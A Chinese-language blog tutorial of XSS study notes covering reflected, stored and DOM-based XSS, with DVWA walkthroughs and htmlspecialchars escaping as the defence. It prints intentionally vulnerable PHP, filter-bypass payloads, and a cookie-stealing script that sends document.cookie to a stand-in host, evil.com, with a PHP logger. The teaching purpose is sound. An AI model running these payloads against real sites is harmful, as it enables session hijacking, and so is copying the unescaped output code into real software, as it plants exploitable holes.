---
title: （二）Web安全深度剖析学习【XSS】
date: 2018-05-17 16:56:51
tags: [WebSecurity, XSS]
categories: WebSecurity
---
《Web安全深度剖析》学习总结, 本部分主要包括XSS原理及三种类型XSS攻击和预防。
一篇较好的博客[XSS跨站脚本攻击(一)----XSS攻击的三种类型](https://blog.csdn.net/u011781521/article/details/53894399)。
<!--more-->
# XSS跨站脚本漏洞 #
XSS(Cross Site Scripting)，即跨站脚本攻击。指攻击者在网页中嵌入客户端脚本，通常是JS编写的恶意代码，当用户使用浏览器浏览被嵌入恶意代码的网页时，恶意代码将会在用户浏览器上执行。XSS属于客户端攻击。

## XSS原理 ##
XSS攻击在网页中嵌入客户端恶意脚本代码，这些恶意脚本代码一般使用JavaScript编写，所以JS能做到什么效果，XSS的威力就有多大。
JavaScript可以用来获取用户cookie，改变页面内容、url跳转，所以存在XSS漏洞的网站就可以盗取用户cookie、黑掉页面、导航到恶意网站。

如下，在formProcess_XSS目录下，创建index.html和index.php，添加如下代码：
**index.html**
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>XSS form process</title>
</head>
<body>
    <form action="index.php" method="POST">
        <input type="text" name="username" />
        <input type="submit" value="提交" />
    </form>
</body>
</html>
```
**index.php**
```php
<?php
    //echo $_SERVER['PHP_SELF'];
    $user_name = $_POST["username"];
    echo $user_name;
?>
```
然后将formProcess_XSS目录丢到phpStudy的WWW目录下，浏览器访问`http://192.168.1.101/formProcess_XSS/index.html`，其中192.168.1.101表示虚拟服务器的地址，当在文本输入框中输入`<script>alert("XSS")</script>`，然后点击提交，就会触发XSS攻击，因为index.php未对用户输入的内容作处理，没有将html的字符处理为html实体，如下：

![XSS攻击学习](https://githubblogbucket1-1258277786.cos.ap-shanghai.myqcloud.com/XSS%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/XSS%E6%94%BB%E5%87%BB.png)
攻击者可以在`<script>`和`</script>`之间输入JavaScript代码，实现一定的攻击效果。在真实攻击中，攻击者不仅仅弹出一个框，通常使用`<script src="http://www.secbug.org/x.txt"></script>`方式来加载外部脚本，而在`x.txt`中存放着攻击者的恶意JavaScript代码，这段代码可能是用来盗取用户的Cookie，也可能是监控键盘记录等恶意行为。
## XSS类型 ##
XSS主要分为三类，反射型(经过后端，不经过数据库)、存储型(经过后端，经过数据库)、DOM型(不经过后端)。
反射型 XSS 的数据流向是：浏览器 -> 后端 -> 浏览器。

存储型 XSS 的数据流向是：浏览器 -> 后端 -> 数据库 -> 后端 -> 浏览器。

DOM-XSS 的数据流向是：URL-->浏览器 
### 反射型XSS ###
反射型XSS也被称为非持久性XSS。当用户访问一个带有XSS代码的URL请求时，服务器端接收数据后处理，然后把带有XSS代码的数据发送到浏览器，浏览器解析这段带有XSS代码的数据后，最终造成XSS漏洞。eg：

**index.php**
```php
<?php
    $user_name = $_GET["username"];
    echo $user_name;
?>
```
在上述代码中，index.php接收`username`值后再输出，若提交`index.php?username=HIM`，则程序将输出HIM，若恶意用户输入`index.php?username=<script>XSS恶意代码<script/>`，将会造成反射型攻击。

有人会问，我怎么可能自己去把HIM改成可以执行的恶意代码呢?这不是自己坑自己吗，但是一种情况是别人可能修改HIM为恶意代码，然后将这个恶意的URL发送给你。反射型XSS盗取用户cookie的过程如下：

- 假设网站A存在XSS漏洞，发送可以触发该漏洞的特定代码到网站A上的目标用户HIM
恶意链接构造如下：
```html
<a href = "http://www.foo.com/xss/xss.php?username=<script src = http://www.evil.com/xss/hacker.js />凤姐最新性感视频</a>
```
其中，`www.foo.com/xss/xss.php?username=` 是存在漏洞的网站A，执行盗取cookie操作的文件位于黑客的网站B，B网站主要有两个文件 `hacker.js`和 `hacker.php`。

hacker.js
```js
var img = new Image();
img.src = "http://www.evil.com/xss/hacker.php?username=" + document.cookie;
document.body.append(img);
```
hacker.php
```php
<?php
$cookie = $_GET['username'];
var_dump($cookie);
$myFile = "cookie.txt";
file_put_contents($myFile, $cookie);
?>
```
- 当用户点击了(凤姐最新性感视频)链接后，被攻击目标HIM用户在网站A的cookie将被黑客拿到，存到网站B的cookie.txt文件中。

**DVWA---XSS(Reflected)**
（1）LOW
SOURCE:
```php
<?php
// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Feedback for end user
    echo '<pre>Hello ' . $_GET[ 'name' ] . '</pre>';
}
?> 
```
漏洞源于，对于接受用户数据的`name`参数没有进行过滤直接在网页中输出。

攻击代码：`<script>alert(document.cookie)</script>`
效果:
![DVWA-XSS-Reflected-LOW](https://githubblogbucket1-1258277786.cos.ap-shanghai.myqcloud.com/XSS%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/DVWA-XSS-Reflect-LOW.png)

（2）MEDIUM
SOURCE:
```php
<?php
// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Get input
    $name = str_replace( '<script>', '', $_GET[ 'name' ] );

    // Feedback for end user
    echo "<pre>Hello ${name}</pre>";
}
?> 
```
上述代码在输出`name`参数中的数据之前，先利用`str_replace(find,replace,string,count))`函数将`<script>`替换为空。

**补充：** [Php中"{}"大括号的用法总结](https://www.cnblogs.com/xiaochaohuashengmi/archive/2011/12/08/2281155.html)，上述代码`echo "<pre>Hello ${name}</pre>"`中，`${name}`与`$name`或`{$name}`是一样的。

攻击代码1，可以使用大写的`<SCRIPT>`：`<SCRIPT>alert(document.cookie)</SCRIPT>`

攻击代码2，通过HTML跨站：`<img src=1 onerror=alert(document.cookie)>`。onerror 事件会在文档或图像加载过程中发生错误时被触发，支持该事件的HTML标签，`<img>`, `<object>`, `<style>`。

（3）HIGH
SOURCE:
```php
<?php
// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Get input
    $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] );

    // Feedback for end user
    echo "<pre>Hello ${name}</pre>";
}
?>  
```
`preg_replace()` 函数执行一个正则表达式的搜索和替换。
上述代码在输出`name`参数中的数据之前，先利用`preg_replace()`函数将含有`<script>`或替`<SCRIPT>`的部分替换为空。

攻击代码：通过HTML跨站：`<img src=1 onerror=alert(document.cookie)>`。

**避免XSS反射型攻击**
利用`htmlspecialchars()`方法：把一些预定义的敏感字符转义为 HTML 实体。所有的跨站语句中基本都离不开这些符号，因而只需要这一个函数就阻止了XSS漏洞。
	
	& （和号） 成为 &amp;
	" （双引号） 成为 &quot;
	' （单引号） 成为 &#039;
	< （小于） 成为 &lt;
	> （大于） 成为 &gt;
如下php代码，阻止了上述利用`<script>`和`<img>`进行的XSS反射型攻击：
```php
<?php
// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Get input
    $name = htmlspecialchars($_GET[ 'name' ]);
    // Feedback for end user
    echo "Hello ${name}";
}
?>  
```
当在文本输入框输入`<script>alert(document.cookie)</script>`或`<img src=1 onerror=alert(document.cookie)>`点击提交GET请求后，利用上述php代码中的`htmlspecialchars()`方法处理敏感字符后返回，避免XSS攻击。

![XSS预防1](https://githubblogbucket1-1258277786.cos.ap-shanghai.myqcloud.com/XSS%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/XSS%E9%A2%84%E9%98%B21.png)

![XSS预防2](https://githubblogbucket1-1258277786.cos.ap-shanghai.myqcloud.com/XSS%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/XSS%E9%A2%84%E9%98%B22.png)
### 存储型 XSS ###
存储型XSS又称为持久性XSS，存储型XSS是最危险的一种跨站脚本。

允许用户存储数据的Web应用程序都可能出现存储型XSS漏洞，当攻击者提交一段XSS代码后，被服务器端接收并存储，当用户再次访问某个页面时，这段XSS代码被程序读出来响应给浏览器，造成XSS跨站攻击，此为存储型XSS。

存储型XSS与反射型XSS、DOM型XSS相比，有更高的隐蔽性，危害更大。反射型XSS、DOM型XSS都依赖用户手动去触发，而存储型XSS不需要。

**一个常见的存储型XSS场景实例**
当测试是否存在存储型XSS时，首先确定输入点与输出点。如在留言板测试存储型XSS漏洞，首先要找出留言内容输出(显示)的地方在标签内还是标签属性内，或者其他地方。

若输出数据在标签属性内，则XSS代码不会被执行，如`<input type="text" name="content" value="<script>alert(document.cookie)</script>" />`,因为`value`属性中的XSS代码被当作值处理，无法当作脚本执行，最终浏览器解析HTML时，将会把数据以文本的形式输出在网页中。

确定输出点后，可以根据相应的标签构造HTML代码来闭合，如插入XSS代码`"/><script>alert(document.cookie)</script>`，最终在HTML文档中变为：`<input type="text" name="content" value=""/><script>alert(document.cookie)</script>" />`，通过闭合input标签，使输出的内容不在value属性，造成XSS跨站攻击。

**具体的存储型XSS漏洞测试如下：**
- 添加正常的留言，查找到显示标签。
- 若显示区域不在HTML属性内，可以直接使用XSS代码注入。若不确定内容输出的具体位置，可以使用模糊测试方案，XSS代码如下：

```html
<script>alert(document.cookie)</script> 普通注入
"/><script>alert(document.cookie)</script> 闭合标签注入
</textarea>'"><script>alert(document.cookie)</script> 闭合标签注入
```
- 在插入盗取cookie的JavaScript代码后，攻击者将该含XSS代码的留言提交，若后端不加处理直接保存到数据库，当用户再次查看这段留言时，浏览器会把XSS代码认为是正常JS代码执行，盗取浏览该留言的用户cookie。

参考博客[通过DVWA学习存储型XSS漏洞](https://blog.csdn.net/SKI_12/article/details/60465854)。

### DOM型 XSS ###
基于DOM型的XSS不需要与服务器端交互，只发生在客户端处理数据阶段。
```html
    <script>
        var temp = document.URL; //获取URL
        var index= document.URL.indexOf("content=") + 8;
        var par = temp.substring(index);
        document.write(decodeURI(par)); //获取输入内容
    </script>
```
上述代码的意思是获取URL中的content参数的值，并且输出，若输入`http://www.secbug.org/dom.html?content=<script>alert(/xss/)</script>`，就会产生XSS漏洞。